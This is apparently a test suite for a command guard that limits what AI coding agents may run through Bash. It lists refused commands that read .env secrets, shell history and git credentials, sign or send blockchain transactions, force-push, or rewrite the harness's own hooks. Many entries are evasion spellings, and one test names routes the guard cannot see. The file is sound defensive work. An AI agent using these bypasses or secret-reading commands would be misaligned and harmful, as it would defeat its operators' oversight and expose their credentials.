      expect(r.status, stdin).toBe(2)
      expect(r.stderr).toContain('failing closed')
    }
  })
  it('settings.json wraps the hook so a crash or missing file still blocks (docs: only exit 2 blocks)', () => {
    const s = JSON.parse(readFileSync(path.join(ROOT, '.claude', 'settings.json'), 'utf8'))
    const entries = s.hooks.PreToolUse.filter((e) => e.matcher === 'Bash').flatMap((e) => e.hooks)
    const guard = entries.find((h) => h.command.includes('command-guard.mjs'))
    expect(guard, 'command-guard wired on Bash').toBeTruthy()
    expect(guard.command).toMatch(/\|\| exit 2$/)
    expect(guard.onFailure).toBe('block')
    // the wrapper really turns "node cannot run the file" (exit 1) into exit 2
    const wrapped = spawnSync('sh', ['-c', 'node "/nonexistent/command-guard.mjs" || exit 2'], { encoding: 'utf8' })
    expect(wrapped.status).toBe(2)
  })
})

// ---------------------------------------------------------------------------------------------------------------
// The owner's A77 tables, as pasted on 2026-11-11 (descriptive rows made concrete). These are the acceptance rows:
// TABLE_A/TABLE_B above are the wider rebuilt tables.
const A77_TABLE_A = {
  'ssh/scp/ssh-add': ['/usr/bin/ssh host', 'env ssh host', '"ssh" host', '\\ssh host', 'sh -c "ssh x"', 'sftp host', 'rsync -e ssh a host:b'],
  pm2: ['env pm2 ls', 'npx pm2 ls', './node_modules/.bin/pm2 ls'],
  'cast send': ['env cast send 0x0 "f()"', '/usr/local/bin/cast send 0x0 "f()"', 'cast --rpc-url x send 0x0', 'cast publish 0xab', 'forge script S.s.sol --broadcast'],
  'keychain security': ['/usr/bin/security find-generic-password -s x', 'env security x', 'sh -c "security x"'],
  'force-push': ['sh -c "git push -f"', 'git push -uf origin x', "git push origin '+x'", '/usr/bin/git push -f', 'env git push -f', 'git push --mirror', 'git push origin :x', 'git push --delete origin x'],
  'gh pr writes': ['gh pr new', 'env gh pr merge 5', '/opt/homebrew/bin/gh pr merge 5', 'sh -c "gh pr merge 5"', 'gh pr edit 5', 'gh pr review 5', 'gh pr comment 5'],
  'gh api writes': ['gh api -f a=b repos/a/b', 'gh api -F a=b repos/a/b', 'gh api -ftitle=x repos/a/b'],
  'npm audit fix': ['npm --prefix . audit fix', 'npm audit --force fix', 'sh -c "npm audit fix"'],
  '.env*': ['grep x .env', 'awk 1 .env', 'node -e "require(\'fs\').readFileSync(\'.env\',\'utf8\')"', 'node -e "console.log(require(\'fs\').readFileSync(\'./.env.local\'))"', 'python3 -c "print(open(\'/abs/.env\').read())"', 'node -e "require(\'dotenv\').config({path:\'.env.production\'})"'],
  'shell history': ['fc -l'],
}
const A77_H4_READONLY = ['git pull', 'git fetch a:b', 'git checkout -b x', 'git config user.name x', 'git clean -fdx', 'git restore file', 'gh api -ftitle=x repos/a/b', 'gh api --field=a=b repos/a/b', 'gh api --input=f repos/a/b']
const A77_TABLE_B_ALL = [
  'git commit -m x', 'git push', 'git push origin chore/x', 'git worktree add /tmp/w origin/main', 'git worktree remove /tmp/w', 'npm ci', 'npm test', 'npm run build', 'npx vitest run', 'forge test', 'cast call 0x0 "f()"',
  'gh pr view 5', 'gh pr diff 5', 'scripts/codeql-local.sh', 'cat .env.example', 'git commit -m "fix: push --force handling, ssh and .env docs"',
  'node -e "console.log(process.env.HOME)"', 'node -e "console.log(require(\'fs\').readFileSync(\'.env.example\',\'utf8\'))"', 'python3 -c "import os; print(os.environ.get(\'HOME\'))"',
]
// New form for read-only agents (A77c): `worktree add` carries --detach, `merge --no-commit` carries --no-ff.
const A77_TABLE_B_READONLY = ['gh pr checks 5', 'git merge --no-commit --no-ff origin/main', 'grep -rn "git push" docs', ...A77_TABLE_B_ALL.filter((c) => !/^git (commit|push)/.test(c)).map((c) => c.replace('git worktree add /tmp/w', 'git worktree add --detach /tmp/w'))]

describe('A77 Table A (owner) — every "Not denied" spelling is now refused', () => {
  for (const [family, cmds] of Object.entries(A77_TABLE_A)) {
    for (const c of cmds) it(`${family}: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
  }
})
describe('A77 H-4 (owner) — refused for auditor and recon', () => {
  for (const c of A77_H4_READONLY) it(`refuses: ${JSON.stringify(c)}`, () => expect(roDecide(c), c).toEqual(expect.any(String)))
  it('commit and push stay blocked for them by design', () => {
    for (const c of ['git commit -m x', 'git push', 'git push origin chore/x']) expect(roDecide(c), c).toEqual(expect.any(String))
  })
})
describe('A77 Table B (owner) — allowed', () => {
  for (const c of A77_TABLE_B_ALL) it(`all agents allow: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  for (const c of A77_TABLE_B_READONLY) it(`auditor/recon allow: ${JSON.stringify(c)}`, () => {
    expect(roDecide(c, { cwd: WT }), c).toBeNull()
    expect(guardDecide(c), c).toBeNull()
  })
})
describe('A77 accepted residual (runbook only, not a test failure)', () => {
  it('"via an npm script" and "via a script file" are not seen by the guard; the runbook says so', () => {
    for (const c of ['npm run force-push', 'bash ./push-force.sh', 'sh push-force.sh', 'source ./push-force.sh']) expect(guardDecide(c), c).toBeNull()
    expect(readFileSync(path.join(ROOT, 'docs', 'Runbooks', 'agent-harness.md'), 'utf8')).toMatch(/script file/)
  })
})

// ---------------------------------------------------------------------------------------------------------------
// ALLOW-LISTS (audit A77b H-6, H-7, M-6, M-9): gh, cast, forge and git-for-read-only-agents run only the listed
// forms. For each list: every permitted form passes, and >= 20 unlisted forms are refused.
const GH_PERMITTED = [
  'gh pr view 5', 'gh pr view 5 --json state', 'gh pr diff 5', 'gh pr checks 5', 'gh pr list', 'gh pr list --state merged', 'gh pr status', 'gh pr checkout 5',
  'gh run view 5', 'gh run view 5 --log', 'gh run list', 'gh repo view', 'gh repo view a/b', 'gh issue view 5', 'gh issue list',
  'gh api repos/a/b/pulls/5', 'gh api repos/a/b', 'gh api repos/a/b -H "Accept: x" --jq .name',
  'gh -R a/b pr view 5', 'gh --repo a/b pr checks 5', 'gh --repo=a/b issue list', 'gh --version', 'gh',
]
const GH_UNLISTED = [
  'gh auth token', 'gh auth status', 'gh auth status --show-token', 'gh auth login', 'gh auth refresh', 'gh auth setup-git', 'gh config get git_protocol', 'gh secret list', 'gh ssh-key list', 'gh gpg-key list',
  'gh extension exec x', 'gh browse', 'gh release view v1', 'gh release list', 'gh workflow list', 'gh workflow run x', 'gh status', 'gh search repos x', 'gh label list', 'gh gist list',
  'gh codeql version', 'gh version', 'gh help', 'gh completion -s zsh', 'gh cache list', 'gh variable list', 'gh ruleset list', 'gh org list', 'gh project list', 'gh repo clone a/b',
  'gh repo list', 'gh run watch 5', 'gh run download 5', 'gh run rerun 5', 'gh issue create', 'gh issue comment 5', 'gh pr create', 'gh pr merge 5', 'gh pr comment 5', 'gh alias list', 'gh codespace list',
  'gh pr', 'gh pr --help', 'gh api -X POST x', 'gh api x -f a=b', 'gh api x --input f', 'gh -H x pr view 5', 'gh --hostname h pr view 5',
]
const CAST_PERMITTED = [
  'cast call 0x0 "f()"', 'cast call 0x0 "f()(uint256)" --rpc-url x', 'cast balance 0x0', 'cast block latest', 'cast block-number', 'cast tx 0xabc', 'cast receipt 0xabc', 'cast code 0x0', 'cast storage 0x0 0',
  'cast chain-id', 'cast gas-price', 'cast nonce 0x0', 'cast logs --from-block 1', 'cast estimate 0x0 "f()"', 'cast sig "f()"', 'cast sig "transfer(address)"', 'cast 4byte 0xa9059cbb', 'cast 4byte-decode 0x', 'cast abi-decode "f()(uint256)" 0x',
  'cast abi-encode "f(uint256)" 1', 'cast calldata "f(uint256)" 1', 'cast calldata-decode "f()" 0x', 'cast keccak x', 'cast to-wei 1', 'cast to-hex 5', 'cast from-wei 1', 'cast --version', 'cast --help', 'cast',
]
const CAST_UNLISTED = [
  'cast send 0x0 "f()"', 'cast s 0x0 "f()"', 'cast publish 0xab', 'cast mktx 0x0 "f()"', 'cast erc20 transfer 0x0 1', 'cast erc20 approve 0x0 1', 'cast erc20 balance 0x0', 'cast wallet new', 'cast wallet sign x', 'cast wallet import x',
  'cast wallet address --private-key k', 'cast keystore list', 'cast rpc eth_sendRawTransaction 0xab', 'cast rpc eth_chainId', 'cast run 0xabc', 'cast bind 0x0', 'cast access-list 0x0', 'cast interface 0x0', 'cast etherscan-source 0x0',
  'cast --rpc-url x send 0x0', 'cast --rpc-url x call 0x0 "f()"', 'cast 0x0 send', 'cast cast send', 'cast completions zsh', 'cast wallet', 'cast send', 'cast send 0x0 --help --private-key k', 'cast c 0x0 "f()"', 'cast b 0x0',
  'cast erc20-token transfer 0x 1', 'cast decode-eof 0x', 'cast creation-code 0x', 'cast proof 0x0', 'cast mktx --help x y z w',
]
const FORGE_PERMITTED = ['forge test', 'forge test --match-test testCreate', 'forge build', 'forge fmt --check', 'forge script S.s.sol', 'forge script S.s.sol --rpc-url x', 'forge --version', 'forge inspect X abi', 'forge coverage']
const FORGE_UNLISTED = [
  'forge script S.s.sol --broadcast', 'forge script --broadcast S.s.sol', 'forge script S --broadcast=true', 'forge script S --resume', 'forge script S.s.sol --rpc-url x --broadcast --verify', 'forge create X', 'forge create src/X.sol:X --rpc-url x',
  'forge create --rpc-url x X', 'forge c X', 'forge create X --broadcast', 'env forge create X', 'sh -c "forge create X"', 'FOO=1 forge script S --broadcast', '/usr/local/bin/forge create X', 'npx forge create X', 'forge script S --legacy --broadcast',
  'forge script S --rpc-url x --private-key k --broadcast', 'forge  create  X', 'forge script S.s.sol --resume --rpc-url x', 'forge --root . create X',
]
const RO_GIT_PERMITTED = [
  'git status', 'git status --short', 'git log --oneline -5', 'git diff origin/main...HEAD --stat', 'git show HEAD:package.json', 'git rev-parse HEAD', 'git ls-files', 'git ls-tree HEAD', 'git cat-file -p HEAD', 'git blame -L1,5 f', 'git grep -n x -- docs',
  'git describe --tags', 'git remote', 'git remote -v', 'git branch', 'git branch --list "chore/*"', 'git branch -a', 'git branch -r --contains abc', 'git branch --show-current', 'git tag', 'git tag -l "v*"', 'git config --get user.name',
  'git config --global --get core.editor', 'git fetch', 'git fetch origin', 'git fetch origin main', 'git fetch --all', 'git fetch --tags origin', 'git fetch origin pull/5/head', 'git worktree add --detach /tmp/w origin/main', 'git worktree add --detach /tmp/w',
  'git worktree remove /tmp/w', 'git worktree remove --force /tmp/w', 'git worktree list', 'git checkout --detach origin/main', 'git merge --no-commit --no-ff origin/main', 'git merge --no-commit --no-ff x', 'git merge --abort', 'git merge --quit', 'git -C /tmp/w status', 'git --no-pager log -1',
  'git merge-base HEAD origin/main', 'git merge-base --is-ancestor a b', 'git rev-list --count HEAD', 'git rev-list origin/main..HEAD', 'git name-rev HEAD', 'git name-rev --name-only HEAD', 'git shortlog -sn HEAD', 'git for-each-ref refs/heads', 'git for-each-ref --format=%(refname:short) refs/remotes',
  'git show-ref', 'git show-ref --verify refs/heads/main', 'git diff-tree --no-commit-id --name-only -r HEAD', 'git status', 'git status -sb',
  // A77d: history readers
  'git stash list', 'git stash list --oneline', 'git reflog', 'git reflog show HEAD', 'git reflog -5', 'git symbolic-ref -q HEAD', 'git symbolic-ref --short HEAD', 'git symbolic-ref HEAD', 'git verify-commit HEAD', 'git verify-commit -v HEAD', 'git verify-commit --raw HEAD',
]
const RO_GIT_UNLISTED = [
  'git commit -m x', 'git push', 'git pull', 'git add .', 'git rm f', 'git mv a b', 'git reset --hard', 'git clean -fd', 'git stash', 'git stash push', 'git stash pop', 'git stash drop', 'git stash clear', 'git stash list --output=x', 'git restore f', 'git apply p', 'git am p', 'git rebase main', 'git cherry-pick abc', 'git revert HEAD',
  'git merge origin/main', 'git merge --continue', 'git checkout .', 'git checkout -- .', 'git checkout main', 'git checkout origin/main', 'git checkout -b x', 'git checkout abc123', 'git switch main', 'git switch --detach x', 'git switch -c x',
  'git worktree add -b x /tmp/w origin/main', 'git worktree add -B x /tmp/w', 'git worktree prune', 'git worktree move a b', 'git worktree lock a', 'git branch x', 'git branch -D x', 'git branch -m a b', 'git tag v1', 'git tag -d v1', 'git tag -a v1 -m x',
  'git config user.name x', 'git config --list', 'git config --unset user.name', 'git config --get', 'git fetch origin a:b', 'git fetch +refs/heads/*:refs/x/*', 'git fetch --prune', 'git fetch --refmap=x:y origin main', 'git remote add x y', 'git remote get-url origin', 'git remote show origin',
  'git reflog expire --all', 'git reflog delete HEAD@{0}', 'git reflog --output=x', 'git update-ref -d x', 'git symbolic-ref HEAD x', 'git symbolic-ref -d HEAD', 'git symbolic-ref -m x HEAD', 'git symbolic-ref', 'git verify-commit --exec x HEAD', 'git gc', 'git fsck', 'git init', 'git clone a b', 'git submodule update', 'git bisect start', 'git notes add', 'git archive HEAD -o x.tar', 'git bundle create x',
  // A77c H-11 / M-11 (owner decisions)
  'git worktree add /tmp/w origin/main', 'git worktree add ../zz', 'git worktree add -f /tmp/w origin/main', 'git merge --no-commit origin/main', 'git merge --no-commit --ff-only origin/main', 'git merge --no-commit --ff origin/main', 'git merge --ff-only origin/main',
  'git fetch --depth 1', 'git fetch --depth 1 origin main', 'git fetch --depth=1', 'git fetch --deepen 3', 'git fetch --shallow-since=2020-01-01', 'git fetch --shallow-exclude=main', 'git fetch --unshallow', 'git fetch --prune', 'git fetch -p', 'git fetch origin main:main', 'git fetch origin +main',
  'git rev-list --output=f HEAD', 'git show-ref --output=f', 'git for-each-ref --output=f',
  'git log --output=f', 'git diff --output=f', 'git grep -O sh x', 'git grep --no-index x', 'git -c core.pager=sh log', 'git -c alias.x=y x', 'git --exec-path=/x log', 'git credential fill', 'git hash-object -w f', 'git fast-import',
]

describe('allow-list: gh', () => {
  it('lists are big enough to mean something', () => { expect(GH_UNLISTED.length).toBeGreaterThanOrEqual(20) })
  for (const c of GH_PERMITTED) it(`permits: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  for (const c of GH_UNLISTED) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
  it('read-only agents get the same gh list, minus `pr checkout` (A77c H-11: it creates or moves a local branch)', () => {
    for (const c of GH_PERMITTED.filter((x) => !x.includes('pr checkout'))) expect(roDecide(c, { cwd: WT }), c).toBeNull()
    for (const c of GH_UNLISTED) expect(roDecide(c), c).toEqual(expect.any(String))
    for (const c of ['gh pr checkout 5', 'gh -R a/b pr checkout 5', 'gh --repo=a/b pr checkout 5 --detach']) expect(roDecide(c), c).toMatch(/pr checkout/)
  })
  it('the implementer and the main session keep `gh pr checkout`', () => {
    for (const agent of [undefined, 'implementer']) expect(hookExit('gh pr checkout 5', agent), String(agent)).toBe(0)
    for (const agent of ['recon', 'auditor']) expect(hookExit('gh pr checkout 5', agent), agent).toBe(2)
  })
})
describe('allow-list: cast', () => {
  it('lists are big enough', () => { expect(CAST_UNLISTED.length).toBeGreaterThanOrEqual(20) })
  for (const c of CAST_PERMITTED) it(`permits: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  for (const c of CAST_UNLISTED) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
})
describe('allow-list: forge', () => {
  it('lists are big enough', () => { expect(FORGE_UNLISTED.length).toBeGreaterThanOrEqual(19) })
  for (const c of FORGE_PERMITTED) it(`permits: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  for (const c of FORGE_UNLISTED) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
})
describe('allow-list: git for read-only agents (recon, auditor)', () => {
  it('lists are big enough', () => { expect(RO_GIT_UNLISTED.length).toBeGreaterThanOrEqual(20) })
  for (const c of RO_GIT_PERMITTED) it(`permits: ${JSON.stringify(c)}`, () => { expect(roDecide(c, { cwd: WT }), c).toBeNull(); expect(guardDecide(c), c).toBeNull() })
  for (const c of RO_GIT_UNLISTED) it(`refuses: ${JSON.stringify(c)}`, () => expect(roDecide(c), c).toEqual(expect.any(String)))
  it('the implementer and the main session are not held to the git list', () => {
    for (const c of ['git commit -m x', 'git add .', 'git worktree add -b x /tmp/w origin/main', 'git stash', 'git rebase main']) expect(guardDecide(c), c).toBeNull()
  })
})

describe('A77b M-6: a flag between the command and the action is refused (cobra eats the next word as its value)', () => {
  for (const c of ['gh pr -t view merge 5', 'gh pr -R a/b view merge', 'gh pr --title view merge 5', 'gh pr -b view comment 5', 'gh issue -t view close 5', 'gh run -x view rerun 5', 'gh -t pr view 5', 'gh repo -q view delete a/b', 'gh pr --repo a/b view 5']) {
    it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
  }
})

// ---------------------------------------------------------------------------------------------------------------
// Commit 2 (A77b H-5, M-10 and lows): redirect targets, history, self-protection, wrappers, over-refusals.
const H5_REFUSED = [
  'while read l; do echo "$l"; done < .env', 'while read l; do echo $l; done < .env.local', '(cat) < .env', '( cat ) < .env.local', '{ cat; } < .env', '{ cat; } <.env', 'if true; then cat; fi < .env',
  'for i in 1; do cat; done < ./.env', 'sh -c "cat" < .env', 'bash -c "while read l; do :; done" < .env', 'while read l; do :; done 0< .env', 'until false; do cat; done < apps/web/.env.production',
  'case x in x) cat;; esac < .env', 'while read l; do :; done < "$PWD/.env"', 'echo hi; ( cat ) < .env.canary', '{ while read l; do :; done; } < .env', 'xargs echo < .env', 'cat < .env', 'time cat < .env', 'env -i sh -c cat < .env',
  'while read l; do :; done <.env.local', 'sh -c "cat" 0<.env', 'echo x > .env', '( echo x ) > .env.local', '{ echo x; } >> .env', 'while true; do echo x; done > .env.production',
]
const H5_ALLOWED = ['while read l; do echo "$l"; done < list.txt', '(cat) < .env.example', '{ cat; } < ./.env.example', 'for f in a b; do echo $f; done', 'echo hi > out.txt', 'cat < package.json', 'while read l; do :; done < <(git ls-files)']
const HISTORY_REFUSED = [
  'cat ~/.zsh_h*', 'cat ~/.zsh_sessions/', 'cat ~/.zsh_sessions/*', 'cat ~/.zsh_sessions/abc.history', 'cat $HISTFILE', 'cat "${HISTFILE}"', 'tail $HISTFILE', 'echo $HISTFILE', 'cat ~/.z*history', 'cat ~/.{zsh,bash}_history',
  'grep x ~/.zsh_sessions/abc', 'less ~/.local/share/fish/fish_h*', 'cat $HOME/.zsh_h*', 'cat ~/.bash_h*', 'cat ~/.*history', 'ls ~/.zsh_sessions', 'head ~/.zsh_history', 'cp ~/.zsh_history /tmp/x', 'cat ~/.pyth*_history',
]
const CREDENTIAL_REFUSED = ['git-credential-osxkeychain get', '/usr/libexec/git-core/git-credential-store get', 'env git-credential-manager get', 'GIT-CREDENTIAL-X get', 'ssh-copy-id host', 'env ssh-copy-id host', '/usr/bin/ssh-copy-id -i k host', 'sh -c "ssh-copy-id host"']
const MIRROR_REFUSED = [
  'git push --mirror', 'git push --mirro', 'git push --mirr origin', 'git push --mir', 'git push --mi', 'git push --m', 'git push origin --mirror', 'git -c remote.origin.mirror=true push', 'git -c remote.origin.mirror push', 'git -c remote.origin.pushurl=x push',
  'git config remote.origin.mirror true', 'git config --add remote.origin.push +refs/*:refs/*', 'git config alias.x "!ssh host"', 'git config credential.helper store', 'git config core.sshCommand x', 'git -c remote.upstream.mirror=1 push upstream',
]
const WRAPPER_REFUSED = [
  'csh -c "ssh host"', 'tcsh -c "git push -f"', 'csh -fc "pm2 ls"', 'script -q /dev/null ssh host', 'script -c "ssh host" /dev/null', 'script', 'coproc ssh host', 'coproc NAME { git push -f; }', 'arch -arm64 ssh host', 'arch -x86_64 git push -f', 'arch -arch arm64 pm2 ls',
  'nocorrect ssh host', 'nocorrect git push -f', 'pnpm ssh host', 'yarn ssh host', 'bunx ssh host', 'bun x pm2 ls', 'pnpm exec ssh host', 'pnpm dlx pm2 ls', 'yarn run ssh host', 'pnpm run ssh host', 'yarn dlx ssh host', 'pnpm audit --fix', 'yarn audit --fix',
  'pnpm git push -f', 'pnpm exec gh pr create', 'bun run cast send 0x0', 'fish -c "ssh host"',
]
const WRAPPER_ALLOWED = ['arch', 'arch -arm64 npm test', 'nocorrect npm test', 'pnpm test', 'pnpm install', 'pnpm run build', 'yarn build', 'bun test', 'pnpm exec vitest run', 'pnpm audit', 'csh -c "echo hi"']
const SELF_REFUSED = [
  'echo x > .claude/settings.json', 'echo x >> .claude/settings.local.json', 'tee .claude/hooks/command-guard.mjs', 'echo x | tee -a .claude/settings.json', 'rm .claude/settings.json', 'rm -rf .claude/hooks', 'rm -f .claude/hooks/shell-parse.mjs',
  'mv x .claude/hooks/y.mjs', 'mv .claude/settings.json /tmp', 'cp x .claude/hooks/', 'cp x .claude/settings.json', 'sed -i s/a/b/ .claude/settings.json', "sed -i '' s/a/b/ .claude/hooks/command-guard.mjs", 'sed -i.bak s/a/b/ .claude/settings.json',
  'sed --in-place s/a/b/ .claude/settings.json', 'sed -ni s/a/b/p .claude/settings.json', 'perl -pi -e s/a/b/ .claude/hooks/readonly-guard.mjs', 'truncate -s 0 .claude/settings.json', 'chmod 777 .claude/hooks/command-guard.mjs', 'cat x > .claude/hooks/command-guard.mjs',
  'cd .claude && rm settings.json', 'cd .claude/hooks && echo x > command-guard.mjs', 'cd .claude; mv settings.json x', 'rm .claude/set*', 'rm .claude/h*', 'rm .claude/*', 'rm -rf .claude', 'echo x > "$PWD/.claude/settings.json"', 'git checkout -- .claude/settings.json',
  'git rm .claude/hooks/readonly-guard.mjs', 'git restore .claude/hooks', '/bin/rm .claude/settings.json', 'sh -c "echo x > .claude/settings.json"', 'echo x > ./.claude/hooks/shell-parse.mjs', 'dd if=x of=.claude/settings.json', 'echo x 2> .claude/settings.json',
  'echo x &> .claude/hooks/a', 'echo x > ~/.claude/settings.json', 'rm $HOME/.claude/hooks/command-guard.mjs', 'ln -sf /dev/null .claude/settings.json', 'touch .claude/hooks/new.mjs', 'echo x > .claude/hooks/{a,b}.mjs', 'echo x >.claude/settings.json',
  '( echo x ) > .claude/settings.json', 'git apply .claude/settings.patch .claude/settings.json',
]
const SELF_ALLOWED = [
  'cat .claude/settings.json', 'git diff .claude/hooks', 'git log -- .claude/settings.json', 'git add -u', 'git add -A', 'git commit -m "x"', 'grep -n deny .claude/settings.json', 'ls .claude/hooks', 'ls -la .claude',
  'echo x > .claude/agents/foo.md', 'cp a .claude/skills/x', 'head -1 .claude/settings.json', 'stat .claude/hooks/command-guard.mjs', 'rg deny .claude/settings.json | head', 'sed -i s/a/b/ src/x.ts', 'rm -f dist/x', 'echo x > out.txt', 'git status', 'cat .claude/hooks/shell-parse.mjs | head',
  'echo x > .claude/launch.json', 'diff .claude/settings.json /tmp/x', 'git show HEAD:.claude/settings.json', 'cd src && rm x', 'ls .claude', 'cat .claude/settings.json', 'wc -l .claude/hooks/*.mjs',
]
const OVER_REFUSALS_ALLOWED = [
  'test -f .env.example', '[ -r .env.example ]', 'ls .env.example', 'ls -la .env.example', 'cast --help', 'cast call --help',
  'grep --color KEY file', 'grep --color=auto KEY file', 'grep --color env docs/x.md', 'grep --colour=never -n KEY src/a.ts', 'grep -n --color KEY file1 file2',
]
// A77c layer 0 re-refuses what A77b had allowed (the raw text names `.env` / `send`; no tokenising to tell a test from a read).
const OVER_REFUSALS_STILL_REFUSED = [
  'cat .env.local', 'ls .env* | xargs cat .env', 'test -f .env.local && cat .env.local', 'ls .env > .env', 'cat $(ls .env*) .env',
  'test -f .env.local', 'test -e .env', '[ -f .env ]', '[ -r .env.production ]', '[[ -f .env.production ]]', 'ls .env*', 'ls -la .env', 'ls -a .env.local', 'ls .env.example .env.local', 'test -f .env.local && echo yes',
  'cast send --help', 'cast send -h', 'cast wallet new --help', 'cast erc20 transfer --help', 'grep --color .env docs/x.md',
]
const HEREDOC_COMMIT_ALLOWED = [
  'git commit -m "$(cat <<\'EOF\'\nfeat: don\'t break the guard\n\nIt\'s fine (really) — mentions ssh host; cat .env; gh pr create\n\nCo-Authored-By: Claude <noreply@anthropic.com>\nEOF\n)"',
  'git commit -S -m "$(cat <<EOF\nfix: it\'s `fine`\nEOF\n)"',
  'git commit -m "$(cat <<-\'EOF\'\n\tfix: don\'t\n\tEOF\n)"',
  'git commit -m "$(cat <<\'EOT\'\nline with ) paren and \' quote\nEOT\n)" && git push -u origin chore/x',
  'git commit -m "$(cat <<\'EOF\'\nx\nEOF\n)"',
  'echo "$(( 1 << 2 ))"',
]
const HEREDOC_STILL_REFUSED = [
  'git commit -m "$(cat <<\'EOF\'\nx\nEOF\n)" && git push -f',
  'echo "$(cat <<\'EOF\'\ndon\'t\nEOF\n) $(ssh host)"',
  'cat "$(cat <<EOF\n$(ssh host)\nEOF\n)"',
  'git commit -m "$(cat <<\'EOF\'\nunterminated body\n)"',
]

describe('A77b H-5: the file-name check covers redirects of compound commands, wrappers and everything else', () => {
  for (const c of H5_REFUSED) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
  for (const c of H5_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  it('the read-only agents get the same refusal through the settings-level guard (both hooks run for them)', () => {
    for (const c of H5_REFUSED.slice(0, 8)) expect(guardDecide(c), c).toEqual(expect.any(String))
  })
})
describe('A77b lows: history by glob / variable, credential helpers, ssh-copy-id, push --mirror in any form', () => {
  for (const c of [...HISTORY_REFUSED, ...CREDENTIAL_REFUSED, ...MIRROR_REFUSED]) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
})
describe('A77b lows: wrappers (csh|tcsh -c, script, coproc, arch, nocorrect) and pnpm|yarn|bun X like npx X', () => {
  for (const c of WRAPPER_REFUSED) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
  for (const c of WRAPPER_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
})
describe('A77b M-10: the harness does not rewrite itself through Bash', () => {
  it('lists are big enough', () => { expect(SELF_REFUSED.length).toBeGreaterThanOrEqual(20) })
  for (const c of SELF_REFUSED) it(`refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
  for (const c of SELF_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
})
describe('A77b lows: no longer over-refused (a valued flag is not a file; test/ls only name files)', () => {
  for (const c of OVER_REFUSALS_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  for (const c of OVER_REFUSALS_STILL_REFUSED) it(`still refuses: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toEqual(expect.any(String)))
})
describe('A77b M-7: a commit-message heredoc with apostrophes is parsed, and still inspected', () => {
  for (const c of HEREDOC_COMMIT_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(guardDecide(c), c).toBeNull())
  for (const c of HEREDOC_STILL_REFUSED) it(`refuses or fails closed: ${JSON.stringify(c)}`, () => {
    let r
    try { r = guardDecide(c) } catch { r = 'threw (the hook exits 2)' }
    expect(r, c).toEqual(expect.any(String))
  })
})

describe('runbook (A77b M-7, M-8): allow-lists as tables, owner path, completed "cannot stop"', () => {
  const rb = readFileSync(path.join(ROOT, 'docs', 'Runbooks', 'agent-harness.md'), 'utf8')
  it('has the allow-list section with a table for gh, cast, forge and git', () => {
    expect(rb).toContain('## Allow-lists')
    for (const needle of ['**`gh`**', '**`cast`**', '**`forge`**', '**`git` for `recon` and `auditor`**', '`erc20 transfer\\|approve`', '`merge` | `--no-commit --no-ff <commit>`', '`worktree` | `add --detach <path> [<commit>]`']) expect(rb, needle).toContain(needle)
    expect((rb.match(/^\| ---|^\|---/gm) ?? []).length).toBeGreaterThanOrEqual(4)
  })
  it('tells the owner how to run a refused legitimate command (one line, own terminal)', () => {
    expect(rb).toContain('## When a refused command is legitimate')
    expect(rb).toMatch(/ONE line in your own terminal/)
  })
  it('"What this cannot stop" names every residual the owner listed', () => {
    const section = rb.slice(rb.indexOf('## What this cannot stop'), rb.indexOf('The backstops are outside'))
    for (const needle of ['Script files', 'interpreters', 'Aliases', 'shell functions', 'run time', 'Recursive reads', 'Exotic shells', 'redirects', 'read-only agents', 'not the Bash tool']) expect(section, needle).toContain(needle)
  })
  it('agent files describe the allow-list, not the old deny list', () => {
    for (const f of ['recon.md', 'auditor.md']) {
      const t = readFileSync(path.join(AGENTS, f), 'utf8')
      expect(t, f).toContain('`checkout --detach`')
      expect(t, f).toContain('`worktree add --detach|remove|list`')
      expect(t, f).toContain('`merge --no-commit --no-ff|--abort|--quit`')
      for (const verb of ['merge-base', 'rev-list', 'name-rev', 'shortlog', 'for-each-ref', 'show-ref', 'diff-tree']) expect(t, `${f} lists ${verb}`).toContain(verb)
      expect(t, f).not.toContain('gh codeql')
      expect(t, f).not.toMatch(/gh pr (view\|diff\|checks\|list\|status)[^`]*checkout/) // read-only agents do not get `pr checkout`
      expect(t, f).toContain('git fetch origin pull/<N>/head')
      expect(t, f).not.toMatch(/git worktree add "\$\{TS_WORKTREE_BASE[^`]*" \.\.\./) // their worktree command carries --detach
    }
  })
})

// ---------------------------------------------------------------------------------------------------------------
// The owner's A77b report (pasted 2026-11-11 15:13): every "must be refused" line exits 2 through BOTH hooks exactly as
// settings.json wires them, every "must be allowed" line exits 0.
const A77B_REFUSED = {
  'H-5': ['while read l; do echo "$l"; done < .env', '(cat) < .env.local', '{ cat; } < .env'],
  'H-6': ['gh auth token', 'gh auth status --show-token', 'gh auth status -t', 'gh auth refresh', 'gh auth login', 'gh auth setup-git'],
  'H-7': ['cast erc20 transfer', 'cast erc20 approve', 'cast erc20-token transfer', 'cast erc20 t', 'cast erc20 a'],
  'M-6': ['gh pr -t view merge 5 --squash', 'gh pr view merge 5', 'gh pr view 5 merge', 'gh pr checks 5 close', 'gh issue view 5 comment'],
